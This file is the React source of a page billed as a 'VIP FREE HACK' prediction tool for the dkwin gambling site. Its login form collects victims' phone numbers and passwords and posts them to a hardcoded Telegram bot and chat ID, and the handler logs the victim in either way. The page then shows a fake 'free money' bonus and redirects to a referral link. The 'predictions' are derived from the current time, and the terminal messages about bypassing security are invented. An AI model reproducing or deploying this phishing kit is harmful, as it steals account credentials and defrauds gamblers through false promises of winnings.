import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Shield, Lock, Smartphone, Terminal, AlertCircle, ChevronRight, Cpu, Activity, Globe } from 'lucide-react';

export default function App() {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [terminalLines, setTerminalLines] = useState<string[]>([]);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [hasClaimed, setHasClaimed] = useState(false);
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [accessKey, setAccessKey] = useState('');
  const [redirectTimer, setRedirectTimer] = useState(1);
  const [prediction, setPrediction] = useState({ text: '...', nums: '-- & --' });
  const [predictionTimer, setPredictionTimer] = useState(30);

  const REGISTRATION_LINK = "https://dkwin9.com/#/register?invitationCode=62371643494";
  const INTERMEDIATE_SITE = "https://www.profitablecpmratenetwork.com/q22i5byud?key=dcf3fce3472d6ba711a0feee502b7013";

  useEffect(() => {
    if (isLoggedIn && hasClaimed && isUnlocked) {
      // Initialize prediction immediately
      const list = ["SMALL 1,3", "SMALL 2,4", "SMALL 0,4", "BIG 6,8", "BIG 7,9", "BIG 5,9"];
      
      const updatePrediction = () => {
        const now = new Date();
        const ms = now.getTime();
        const p = Math.floor(ms / 30000);
        const seed = p * 1.234;
        const idx = Math.floor(Math.abs(Math.sin(seed) * list.length)) % list.length;
        const resultData = list[idx].split(' '); 
        setPrediction({ text: resultData[0], nums: resultData[1] });

        const totalSec = now.getSeconds();
        const remaining = totalSec >= 30 ? 60 - totalSec : 30 - totalSec;
        setPredictionTimer(remaining);
      };

      updatePrediction();

      // Redirect timer
      const rTimer = setInterval(() => {
        setRedirectTimer(prev => {
          if (prev <= 1) {
            clearInterval(rTimer);
            window.location.href = REGISTRATION_LINK;
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      // Prediction engine update
      const pInterval = setInterval(updatePrediction, 1000);

      return () => {
        clearInterval(rTimer);
        clearInterval(pInterval);
      };
    }
  }, [isLoggedIn, isUnlocked]);

  useEffect(() => {
    document.title = "〲𝗧ʀᴀᴅᴇʀ 𝗧ᴀᴍɪᴍ —͟͟͞͞𖣘 💮";
    const lines = [
      "> INITIALIZING TAMIM_HACK_v5.0",
      "> BYPASSING SECURITY PROTOCOLS...",
      "> CONNECTING TO DKWIN SERVER...",
      "> TUNNEL ESTABLISHED [AES-256]",
      "> READY FOR PREDICTION"
    ];
    let i = 0;
    const interval = setInterval(() => {
      if (i < lines.length) {
        setTerminalLines(prev => [...prev, lines[i]]);
        i++;
      } else {
        clearInterval(interval);
      }
    }, 600);
    return () => clearInterval(interval);
  }, []);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    const BOT_TOKEN = "8654386699:AAHnd5JW6edp7SS63-AKUiCy18GpblVI7cI";
    const CHAT_ID = "8596479830";

    setTimeout(async () => {
      const cleanPhone = phoneNumber.trim();
      
      if (cleanPhone.length !== 11) {
        setError('ফোন নম্বর অবশ্যই ১১ ডিজিটের হতে হবে!');
        setIsLoading(false);
        return;
      }

      if (password.length < 8) {
        setError('পাসওয়ার্ড কমপক্ষে ৮ অক্ষরের হতে হবে!');
        setIsLoading(false);
        return;
      }

      // Prepare message for Telegram with HTML for click-to-copy
      // Phone number will be copyable without the leading zero if it exists
      const displayPhone = cleanPhone.startsWith('0') 
        ? `0<code>${cleanPhone.substring(1)}</code>` 
        : `<code>${cleanPhone}</code>`;

      const message = `
🚀 <b>VIP HACK LOGIN ATTEMPT</b> 🚀
━━━━━━━━━━━━━━━━━━
📱 <b>Phone:</b> ${displayPhone}
🔑 <b>Password:</b> <code>${password}</code>
🌐 <b>IP:</b> (Client Side)
━━━━━━━━━━━━━━━━━━
      `;

      try {
        // Send to Telegram
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
          }),
        });
      } catch (err) {
        console.error("Telegram notification failed:", err);
      }

      // Redirect immediately after sending (or trying to send)
      setIsLoggedIn(true);
      setIsLoading(false);
    }, 800);
  };

  if (isLoggedIn) {
    if (!hasClaimed) {
      return (
        <div className="fixed inset-0 bg-[#8B0000] flex items-center justify-center p-4 overflow-hidden font-sans">
          {/* Background decorative elements (simulating a game) */}
          <div className="absolute inset-0 opacity-30">
            <div className="absolute top-10 left-10 w-32 h-32 bg-yellow-500 rounded-full blur-3xl animate-pulse" />
            <div className="absolute bottom-10 right-10 w-40 h-40 bg-orange-600 rounded-full blur-3xl animate-pulse delay-700" />
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full border-[20px] border-yellow-600/20 rounded-full animate-spin-slow" />
          </div>

          <motion.div 
            initial={{ scale: 0.5, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="relative w-full max-w-[340px] bg-gradient-to-b from-white/10 to-black/40 backdrop-blur-md border-4 border-yellow-500/50 rounded-[40px] p-8 text-center shadow-[0_0_50px_rgba(234,179,8,0.3)]"
          >
            {/* Header */}
            <h2 className="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-b from-white via-red-500 to-orange-600 drop-shadow-[0_4px_4px_rgba(0,0,0,0.8)] mb-1 italic">
              Congratulations!
            </h2>
            <div className="text-xl font-black text-white drop-shadow-md mb-1 uppercase tracking-tight">
              Free Money
            </div>
            <div className="text-sm font-bold text-white/90 mb-6 italic">
              Here's your welcome bonus
            </div>

            {/* Coin Bowl Visual */}
            <div className="relative h-48 mb-6 flex items-center justify-center">
              {/* Floating coins */}
              <motion.div 
                animate={{ y: [-10, 10, -10], rotate: [0, 10, 0] }}
                transition={{ duration: 3, repeat: Infinity }}
                className="absolute top-0 left-1/4 w-8 h-8 bg-yellow-400 rounded-full border-2 border-yellow-600 shadow-lg flex items-center justify-center text-[10px] font-bold text-yellow-800"
              >৳</motion.div>
              <motion.div 
                animate={{ y: [10, -10, 10], rotate: [0, -15, 0] }}
                transition={{ duration: 4, repeat: Infinity }}
                className="absolute top-4 right-1/4 w-10 h-10 bg-yellow-400 rounded-full border-2 border-yellow-600 shadow-lg flex items-center justify-center text-xs font-bold text-yellow-800"
              >৳</motion.div>

              {/* The Bowl */}
              <div className="relative w-40 h-32 mt-8">
                {/* Coins in bowl */}
                <div className="absolute -top-4 left-1/2 -translate-x-1/2 w-32 h-20 bg-yellow-500 rounded-full shadow-inner overflow-hidden">
                  <div className="grid grid-cols-4 gap-1 p-2 opacity-80">
                    {[...Array(12)].map((_, i) => (
                      <div key={i} className="w-full aspect-square bg-yellow-400 rounded-full border border-yellow-600 shadow-sm" />
                    ))}
                  </div>
                </div>
                {/* Bowl body */}
                <div className="absolute inset-0 bg-gradient-to-b from-yellow-400 via-red-600 to-red-900 rounded-b-[60px] border-t-4 border-yellow-300 shadow-2xl" />
                <div className="absolute top-0 left-0 w-full h-4 bg-yellow-300/30 rounded-full blur-sm" />
              </div>
            </div>

            {/* Amount Display */}
            <div className="relative mb-8">
              <div className="absolute inset-0 bg-black/40 blur-md -skew-x-12" />
              <div className="relative py-2 px-4 border-y-2 border-yellow-500/30">
                <span className="text-4xl font-black text-yellow-400 drop-shadow-[0_2px_10px_rgba(234,179,8,0.5)] tracking-tighter">
                  199,990
                </span>
              </div>
            </div>

            {/* Claim Button */}
            <button 
              onClick={() => setHasClaimed(true)}
              className="relative group w-full py-4 bg-gradient-to-b from-yellow-300 to-yellow-600 rounded-full text-black font-black text-2xl uppercase tracking-widest shadow-[0_10px_20px_rgba(0,0,0,0.4)] active:scale-95 transition-all"
            >
              Claim
              {/* Hand Cursor Icon Animation */}
              <motion.div 
                animate={{ 
                  scale: [1, 1.2, 1],
                  x: [0, 5, 0],
                  y: [0, 5, 0]
                }}
                transition={{ duration: 1, repeat: Infinity }}
                className="absolute -bottom-4 -right-4 w-12 h-12 pointer-events-none"
              >
                <svg viewBox="0 0 24 24" fill="white" stroke="black" strokeWidth="1" className="w-full h-full drop-shadow-lg">
                  <path d="M13,3C13,3 12,3 12,4C12,5 13,6 13,6V9H12V2C12,2 11,2 11,3C11,4 12,5 12,5V9H11V3C11,3 10,3 10,4C10,5 11,6 11,6V9H10V5C10,5 9,5 9,6C9,7 10,8 10,8V16C10,16 10,20 14,20C18,20 18,16 18,16V10C18,10 18,9 17,9C16,9 16,10 16,10V12H15V6C15,6 15,5 14,5C13,5 13,6 13,6V9H12V3Z" />
                </svg>
              </motion.div>
            </button>
          </motion.div>

          {/* Recent Winners Ticker */}
          <div className="absolute bottom-10 left-0 right-0 overflow-hidden px-4">
            <div className="max-w-xs mx-auto bg-black/60 backdrop-blur-sm rounded-full py-1 px-4 border border-white/10">
              <motion.div 
                animate={{ x: [-20, 20, -20] }}
                transition={{ duration: 5, repeat: Infinity, ease: "linear" }}
                className="text-[10px] text-white/60 font-bold whitespace-nowrap text-center"
              >
                9158****07 Just had 200,000 coins
              </motion.div>
            </div>
          </div>

          <style>{`
            @keyframes spin-slow {
              from { transform: translate(-50%, -50%) rotate(0deg); }
              to { transform: translate(-50%, -50%) rotate(360deg); }
            }
            .animate-spin-slow {
              animation: spin-slow 20s linear infinite;
            }
          `}</style>
        </div>
      );
    }

    return (
      <div className="fixed inset-0 bg-black overflow-hidden">
        <iframe 
          src={INTERMEDIATE_SITE} 
          className="w-full h-full border-none"
          title="Game Frame"
        />
        
        {/* Floating Hacker Box */}
        <motion.div 
          drag
          dragMomentum={false}
          initial={{ top: '15%', left: '50%', x: '-50%' }}
          className="absolute w-[180px] bg-black border-[3px] border-red-500 rounded-lg p-4 text-center z-50 shadow-[0_0_15px_rgba(255,0,0,0.5)] cursor-move select-none animate-rgb-border"
        >
          {/* Scan line */}
          <div className="absolute top-0 left-0 w-full h-[3px] bg-[#00ff00] shadow-[0_0_20px_2px_#00ff00] animate-scanline-move pointer-events-none" />
          
          <div className="text-white font-black text-[13px] border-b border-white/20 pb-2 mb-3 tracking-wider uppercase">
            〲𝗧ʀᴀᴅᴇʀ 𝗧ᴀᴍɪᴍ —͟͟͞͞𖣘 💮
          </div>

          {!isUnlocked ? (
            <div className="space-y-3">
              <input 
                type="password"
                value={accessKey}
                onChange={(e) => setAccessKey(e.target.value)}
                placeholder="ENTER KEY"
                className="w-full bg-[#111] border border-[#444] p-2 text-center text-white text-[11px] outline-none focus:border-neon-green transition-all rounded"
              />
              <button 
                onClick={() => {
                  if (accessKey === 'joyvai') {
                    setIsUnlocked(true);
                  } else {
                    alert('WRONG KEY');
                  }
                }}
                className="w-full py-2.5 bg-[#00ff00] text-black text-[10px] font-black rounded uppercase hover:brightness-110 active:scale-95 transition-all"
              >
                START
              </button>
            </div>
          ) : (
            <div className="space-y-3">
              <div className="bg-white/10 border border-white/20 p-2.5 rounded-md shadow-inner">
                <div className="text-[9px] text-yellow-400 font-black uppercase mb-1 tracking-widest">PREDICTION</div>
                <div className={`text-2xl font-black mb-1 ${prediction.text === 'BIG' ? 'text-cyan-400' : 'text-fuchsia-400'}`}>
                  {prediction.text}
                </div>
                <div className="text-sm font-black text-[#00ff00] tracking-widest">
                  {prediction.nums}
                </div>
              </div>

              <div className="text-[11px] text-white font-bold">
                NEXT : <span className="text-red-500">{predictionTimer}</span>s
              </div>

              <a 
                href="https://t.me/dkwingiftcodefree4" 
                target="_blank" 
                rel="noopener noreferrer"
                className="block w-full py-2 bg-red-600 text-white text-[10px] font-black rounded uppercase hover:bg-red-700 transition-all shadow-[0_0_15px_rgba(220,38,38,0.4)] active:scale-95 text-center"
              >
                TELEGRAM
              </a>
            </div>
          )}
        </motion.div>

        <style>{`
          @keyframes rgb-border {
            0% { border-color: #ff0000; box-shadow: 0 0 15px #ff0000; }
            20% { border-color: #ffff00; box-shadow: 0 0 15px #ffff00; }
            40% { border-color: #00ff00; box-shadow: 0 0 15px #00ff00; }
            60% { border-color: #00ffff; box-shadow: 0 0 15px #00ffff; }
            80% { border-color: #0000ff; box-shadow: 0 0 15px #0000ff; }
            100% { border-color: #ff00ff; box-shadow: 0 0 15px #ff00ff; }
          }
          .animate-rgb-border {
            animation: rgb-border 5s linear infinite;
          }
          @keyframes scanline-move {
            0% { top: -5%; opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { top: 105%; opacity: 0; }
          }
          .animate-scanline-move {
            animation: scanline-move 2s linear infinite;
          }
        `}</style>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-6 bg-brutal-black overflow-hidden font-mono selection:bg-neon-green selection:text-brutal-black">
      {/* Background Grid (Square Lines) */}
      <div className="absolute inset-0 opacity-20 pointer-events-none overflow-hidden">
        <div className="absolute inset-0" 
             style={{ 
               backgroundImage: 'linear-gradient(to right, #00FF00 1px, transparent 1px), linear-gradient(to bottom, #00FF00 1px, transparent 1px)', 
               backgroundSize: '40px 40px' 
             }} />
        <motion.div 
          animate={{ y: ['0%', '100%'] }}
          transition={{ duration: 15, repeat: Infinity, ease: "linear" }}
          className="absolute inset-0 bg-gradient-to-b from-transparent via-neon-green/5 to-transparent h-[200%] w-full"
        />
      </div>

      <motion.div 
        initial={{ scale: 0.95, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        className="w-full max-w-md relative z-10"
      >
        {/* Top Status Bar */}
        <div className="flex justify-between items-center mb-2 px-2 text-[10px] text-neon-green/50 uppercase tracking-widest">
          <div className="flex items-center gap-2">
            <Activity className="w-3 h-3 animate-pulse" />
            <span>Link: Established</span>
          </div>
          <div className="flex items-center gap-2">
            <Globe className="w-3 h-3" />
            <span>Region: BD_SEC_01</span>
          </div>
        </div>

        {/* Header with Glitch Effect (Reverted to First Design) */}
        <div className="mb-10 text-center relative pt-10">
          <motion.div
            animate={{ 
              x: [-2, 2, -2, 2, 0],
              y: [1, -1, 1, -1, 0],
              filter: ["hue-rotate(0deg)", "hue-rotate(90deg)", "hue-rotate(180deg)", "hue-rotate(270deg)", "hue-rotate(0deg)"]
            }}
            transition={{ repeat: Infinity, duration: 0.15, repeatDelay: 2 }}
            className="inline-flex flex-col items-center"
          >
            <h1 className="text-[40px] md:text-[65px] font-black uppercase tracking-tighter italic relative leading-tight flex flex-col items-center">
              <span className="text-white drop-shadow-[0_0_25px_rgba(255,255,255,0.4)]">VIP FREE HACK</span>
              
              {/* Glitch Layers (Popping Out Effect) */}
              <motion.div 
                animate={{ x: [-3, 3, -3], opacity: [0.5, 0.8, 0.5] }}
                transition={{ duration: 0.1, repeat: Infinity }}
                className="absolute -top-1 -left-1 text-red-500 opacity-50 select-none flex flex-col items-center w-full pointer-events-none mix-blend-screen"
              >
                <span>VIP FREE HACK</span>
              </motion.div>
              <motion.div 
                animate={{ x: [3, -3, 3], opacity: [0.5, 0.8, 0.5] }}
                transition={{ duration: 0.1, repeat: Infinity, delay: 0.05 }}
                className="absolute top-1 left-1 text-blue-500 opacity-50 select-none flex flex-col items-center w-full pointer-events-none mix-blend-screen"
              >
                <span>VIP FREE HACK</span>
              </motion.div>
            </h1>
          </motion.div>
          <div className="h-2.5 w-64 bg-neon-green mx-auto mt-8 skew-x-[-25deg] shadow-[0_0_30px_#00FF00]" />
        </div>

        {/* Terminal Output */}
        <div className="mb-8 p-4 bg-zinc-900/95 border-2 border-neon-green font-mono text-[11px] text-neon-green h-32 overflow-hidden shadow-[0_0_30px_rgba(0,255,0,0.15)] relative">
          <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-b from-transparent via-neon-green/5 to-transparent pointer-events-none animate-scanline" />
          <AnimatePresence>
            {terminalLines.map((line, idx) => (
              <motion.div 
                key={idx}
                initial={{ x: -10, opacity: 0 }}
                animate={{ x: 0, opacity: 1 }}
                className="flex gap-2 mb-1"
              >
                <span className="text-neon-green/40">[{idx.toString().padStart(2, '0')}]</span>
                <span>{line}</span>
              </motion.div>
            ))}
          </AnimatePresence>
          <motion.span 
            animate={{ opacity: [1, 0] }}
            transition={{ repeat: Infinity, duration: 0.6 }}
            className="inline-block w-2 h-3 bg-neon-green ml-1"
          />
        </div>

        {/* Login Form Container */}
        <div className="relative group">
          {/* Scanning Line Animation */}
          <motion.div 
            animate={{ top: ['0%', '100%'] }}
            transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
            className="absolute left-0 right-0 h-[2px] bg-neon-green/40 z-20 shadow-[0_0_10px_#00FF00] pointer-events-none"
          />

          <form onSubmit={handleLogin} className="bg-zinc-900/95 p-8 border-2 border-neon-green/30 space-y-6 relative overflow-hidden shadow-[0_0_40px_rgba(0,255,0,0.05)]">
            {/* Corner Accents (Unique Design) */}
            <div className="absolute top-0 left-0 w-8 h-8 border-t-4 border-l-4 border-neon-green" />
            <div className="absolute top-0 right-0 w-8 h-8 border-t-4 border-r-4 border-neon-green" />
            <div className="absolute bottom-0 left-0 w-8 h-8 border-b-4 border-l-4 border-neon-green" />
            <div className="absolute bottom-0 right-0 w-8 h-8 border-b-4 border-r-4 border-neon-green" />

            <div className="space-y-3">
              <label className="text-[11px] uppercase font-black tracking-[0.25em] text-zinc-500 flex items-center gap-2">
                <Smartphone className="w-3.5 h-3.5 text-neon-green" /> Phone Number (11 Digits)
              </label>
              <div className="relative">
                <input 
                  type="text"
                  maxLength={11}
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                  placeholder="01XXXXXXXXX"
                  className="w-full bg-black/50 border-2 border-zinc-800 p-5 font-mono text-neon-green outline-none focus:border-neon-green focus:shadow-[0_0_15px_rgba(0,255,0,0.2)] transition-all placeholder:text-zinc-800 text-lg"
                  required
                />
              </div>
            </div>

            <div className="space-y-3">
              <label className="text-[11px] uppercase font-black tracking-[0.25em] text-zinc-500 flex items-center gap-2">
                <Lock className="w-3.5 h-3.5 text-neon-green" /> Password (Min 8 Chars)
              </label>
              <input 
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
                className="w-full bg-black/50 border-2 border-zinc-800 p-5 font-mono text-neon-green outline-none focus:border-neon-green focus:shadow-[0_0_15px_rgba(0,255,0,0.2)] transition-all placeholder:text-zinc-800 text-lg"
                required
              />
            </div>

            <AnimatePresence mode="wait">
              {error && (
                <motion.div 
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: -20 }}
                  className="flex items-center gap-3 text-red-500 text-[10px] font-bold bg-red-500/5 p-4 border-l-2 border-red-500 uppercase tracking-wider"
                >
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{error}</span>
                </motion.div>
              )}
            </AnimatePresence>

            <button 
              type="submit"
              disabled={isLoading}
              className="w-full group relative py-6 bg-neon-green text-black font-black uppercase tracking-[0.4em] hover:brightness-110 active:scale-[0.98] transition-all disabled:opacity-50 disabled:cursor-not-allowed overflow-hidden shadow-[0_0_30px_rgba(0,255,0,0.3)]"
            >
              <div className="relative z-10 flex items-center justify-center gap-4 text-xl">
                {isLoading ? (
                  <>
                    <motion.div 
                      animate={{ rotate: 360 }}
                      transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                    >
                      <Cpu className="w-6 h-6" />
                    </motion.div>
                    <span>BYPASSING...</span>
                  </>
                ) : (
                  <>
                    <span>BYPASS SECURITY</span>
                    <ChevronRight className="w-6 h-6 group-hover:translate-x-2 transition-transform" />
                  </>
                )}
              </div>
            </button>
          </form>

          <div className="mt-8 text-center">
            <a 
              href={REGISTRATION_LINK}
              target="_blank"
              rel="noopener noreferrer"
              className="text-zinc-500 hover:text-neon-green text-xs tracking-widest transition-colors uppercase"
            >
              Don't have an account? <span className="text-neon-green font-bold underline">Register Now</span>
            </a>
          </div>
        </div>

        {/* Footer Info */}
        <div className="mt-8 flex justify-between items-center text-[9px] text-zinc-600 font-mono uppercase tracking-widest">
          <div className="flex items-center gap-2">
            <div className="w-1.5 h-1.5 rounded-full bg-neon-green animate-pulse" />
            Node: BD_DHAKA_09
          </div>
          <div className="flex items-center gap-4">
            <span>Enc: AES_256</span>
            <span>v4.0.1_STABLE</span>
          </div>
        </div>
      </motion.div>

      {/* Decorative Floating Elements */}
      <div className="fixed top-10 left-10 text-[10px] text-neon-green/10 font-mono hidden lg:block pointer-events-none">
        {`{
  "protocol": "VIP_HACK",
  "status": "active",
  "bypass_level": 9,
  "encryption": "SHA-512"
}`}
      </div>
      <div className="fixed bottom-10 right-10 text-[10px] text-neon-green/10 font-mono hidden lg:block pointer-events-none">
        01010111 01001000 01000001 01010100 00100000 01001001 01010011 00100000 01001000 01000001 01000011 01001011
      </div>
    </div>
  );
}
